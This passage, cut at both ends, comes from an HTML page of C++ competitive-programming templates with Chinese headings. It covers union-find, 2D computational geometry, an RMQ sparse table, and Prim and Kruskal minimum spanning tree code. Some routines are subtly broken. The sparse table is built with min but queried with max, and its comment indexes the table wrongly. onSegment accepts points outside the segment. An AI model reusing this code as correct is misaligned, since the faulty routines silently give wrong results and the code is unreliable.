class="token operator">=</span> parent<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>rank<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">==</span>rank<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span>                rank<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="7-计算几何"><a href="#7-计算几何" class="headerlink" title="7. 计算几何"></a>7. 计算几何</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> db eps<span class="token operator">=</span><span class="token number">1e-9</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span>db a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">&lt;</span>eps<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span>db a<span class="token punctuation">,</span> db b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span>a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">Point</span><span class="token punctuation">&#123;</span>    db x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token function">Point</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Point</span><span class="token punctuation">(</span>db _x<span class="token punctuation">,</span>db _y<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">x</span><span class="token punctuation">(</span>_x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">y</span><span class="token punctuation">(</span>_y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> Point Vec<span class="token punctuation">;</span><span class="token comment">// 向量+向量 = 向量 ，点 + 向量 = 点 </span>Vec <span class="token keyword">operator</span><span class="token operator">+</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span> Vec B<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">+</span> B<span class="token punctuation">.</span>x<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">+</span> B<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">// 点 - 点 = 向量 </span>Vec <span class="token keyword">operator</span><span class="token operator">-</span><span class="token punctuation">(</span>Point A<span class="token punctuation">,</span> Point B<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">-</span> B<span class="token punctuation">.</span>x<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">-</span> B<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//向量 * 数 = 向量</span>Vec <span class="token keyword">operator</span><span class="token operator">*</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span> db p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">*</span> p<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//向量 / 数 = 向量</span>Vec <span class="token keyword">operator</span><span class="token operator">/</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span> db p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">/</span> p<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">/</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">const</span> Point <span class="token operator">&amp;</span>A <span class="token punctuation">,</span><span class="token keyword">const</span> Point <span class="token operator">&amp;</span>B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">-</span> B<span class="token punctuation">.</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sign</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>y <span class="token operator">-</span> B<span class="token punctuation">.</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">Line</span><span class="token punctuation">&#123;</span>    Point a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>    <span class="token function">Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Line</span><span class="token punctuation">(</span>Point _a<span class="token punctuation">,</span>Point _b<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">a</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">b</span><span class="token punctuation">(</span>_b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/*  两点间距离   */</span>db <span class="token function">get_distance</span><span class="token punctuation">(</span>Point a<span class="token punctuation">,</span> Point b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token operator">-</span>b<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token operator">-</span>b<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>y<span class="token operator">-</span>b<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>y<span class="token operator">-</span>b<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//  两向量的叉乘</span>db <span class="token function">Cross</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>Vec B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> A<span class="token punctuation">.</span>x <span class="token operator">*</span> B<span class="token punctuation">.</span>y <span class="token operator">-</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> B<span class="token punctuation">.</span>x<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>db <span class="token function">Area2</span><span class="token punctuation">(</span>Point A<span class="token punctuation">,</span>Point B<span class="token punctuation">,</span>Point C<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">Cross</span><span class="token punctuation">(</span>B <span class="token operator">-</span> A<span class="token punctuation">,</span> C <span class="token operator">-</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//  两向量的点乘</span>db <span class="token function">Dot</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>Vec B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> A<span class="token punctuation">.</span>x <span class="token operator">*</span> B<span class="token punctuation">.</span>x <span class="token operator">+</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> B<span class="token punctuation">.</span>y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//向量长度</span>db <span class="token function">Length</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//向量角度</span>db <span class="token function">angle</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>Vec B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">acos</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求向量的单位法线(A不能是零向量)</span>Vec <span class="token function">Normal</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>db L <span class="token operator">=</span> <span class="token function">Length</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span><span class="token operator">-</span>A<span class="token punctuation">.</span>y <span class="token operator">/</span> L<span class="token punctuation">,</span> A<span class="token punctuation">.</span>x <span class="token operator">/</span> L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求向量旋转 , 逆时针旋转角度rad</span>Vec <span class="token function">Rotate</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>db rad<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token function">cos</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span> <span class="token operator">-</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">.</span>x <span class="token operator">*</span> <span class="token function">sin</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span> <span class="token operator">+</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token function">cos</span><span class="token punctuation">(</span>rad<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求点到直线的距离</span>db <span class="token function">dis_dot_Line</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span>Point A<span class="token punctuation">,</span>Point B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Vec v1 <span class="token operator">=</span> B <span class="token operator">-</span> A<span class="token punctuation">,</span> v2 <span class="token operator">=</span> P <span class="token operator">-</span> A<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">Cross</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//求点到直线的投影</span>Point <span class="token function">GetLineProjection</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span>Point A <span class="token punctuation">,</span>Point B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Vec v <span class="token operator">=</span> B <span class="token operator">-</span> A<span class="token punctuation">;</span>    <span class="token keyword">return</span> A <span class="token operator">+</span> v <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> P <span class="token operator">-</span> A<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Dot</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//线段相交  (规范相交)</span><span class="token keyword">bool</span> <span class="token function">SegmentIntersection</span><span class="token punctuation">(</span>Point A1<span class="token punctuation">,</span>Point A2<span class="token punctuation">,</span>Point B1<span class="token punctuation">,</span>Point B2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    db c1 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>A2 <span class="token operator">-</span> A1<span class="token punctuation">,</span> B1 <span class="token operator">-</span> A1<span class="token punctuation">)</span><span class="token punctuation">,</span> c2 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>A2 <span class="token operator">-</span> A1<span class="token punctuation">,</span> B2 <span class="token operator">-</span> A1<span class="token punctuation">)</span><span class="token punctuation">;</span>    db c3 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>B2 <span class="token operator">-</span> B1<span class="token punctuation">,</span> A1 <span class="token operator">-</span> B1<span class="token punctuation">)</span><span class="token punctuation">,</span> c4 <span class="token operator">=</span> <span class="token function">Cross</span><span class="token punctuation">(</span>B2 <span class="token operator">-</span> B1<span class="token punctuation">,</span> A2 <span class="token operator">-</span> B1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">sign</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sign</span><span class="token punctuation">(</span>c3<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">sign</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断点是否在线段上（不包含端点）</span><span class="token keyword">bool</span> <span class="token function">onSegment</span><span class="token punctuation">(</span>Point p<span class="token punctuation">,</span>Point a1<span class="token punctuation">,</span>Point a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Cross</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> p<span class="token punctuation">,</span> a2 <span class="token operator">-</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> p<span class="token punctuation">,</span> a2 <span class="token operator">-</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//点到线段的距离</span>db <span class="token function">distancetosegment</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span>Point A<span class="token punctuation">,</span>Point B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">==</span>B<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">Length</span><span class="token punctuation">(</span>P <span class="token operator">-</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span>    Vec v1 <span class="token operator">=</span> B <span class="token operator">-</span> A<span class="token punctuation">,</span> v2 <span class="token operator">=</span> P <span class="token operator">-</span> A<span class="token punctuation">,</span> v3 <span class="token operator">=</span> P <span class="token operator">-</span> B<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">Length</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token function">Dot</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">Length</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">Cross</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">Length</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="8-RMQ-算法-ST表"><a href="#8-RMQ-算法-ST表" class="headerlink" title="8. RMQ 算法(ST表)"></a>8. RMQ 算法(ST表)</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* * st表 * st[i][j]表示元素arr[i]开始，长度为2^j区间内的最值 * st[i][0]为arr[i]，st[i][j] = max(st[i][j-1], st[i - (1 &lt;&lt; j-1)][j-1]) * 求区间[l, r]内最值： * Log[i]代表i的对数向下取整 * 对于长度len而言，显然2^log2[len]严格大于len的一半 * 令k = Log[r - l + 1]，则最值为max(st[l][k], st[r - (1&lt;&lt;k) + 1][k]) */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">maxn</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">55000</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> Log<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> st<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">st_prepare</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     Log<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        Log<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>Log<span class="token punctuation">[</span>i<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    st<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>j<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> j<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> st<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">st_query</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> Log<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">max</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> st<span class="token punctuation">[</span>r <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="9-最小生成树"><a href="#9-最小生成树" class="headerlink" title="9. 最小生成树"></a>9. 最小生成树</h3><h4 id="9-1-prime算法"><a href="#9-1-prime算法" class="headerlink" title="9.1 prime算法"></a>9.1 prime算法</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to <span class="token punctuation">;</span>    ll cost<span class="token punctuation">;</span>    <span class="token function">edge</span> <span class="token punctuation">(</span><span class="token keyword">int</span> tt<span class="token punctuation">,</span><span class="token keyword">int</span> cc<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token function">to</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cost</span><span class="token punctuation">(</span>cc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">edge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> edge <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a<span class="token punctuation">.</span>cost <span class="token operator">&lt;</span>cost<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>edge<span class="token operator">></span> que<span class="token punctuation">;</span>vector <span class="token operator">&lt;</span>edge<span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>ll <span class="token function">prime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vis<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>que<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        edge e<span class="token operator">=</span>que<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        res<span class="token operator">+=</span>e<span class="token punctuation">.</span>cost<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="9-2-kruscal-算法"><a href="#9-2-kruscal-算法" class="headerlink" title="9.2 kruscal 算法"></a>9.2 kruscal 算法</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">;</span>    ll cost<span class="token punctuation">;</span>    <span class="token function">edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> tt<span class="token punctuation">,</span>ll cst<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token function">to</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">cost</span><span class="token punctuation">(</span>cst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">edge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token 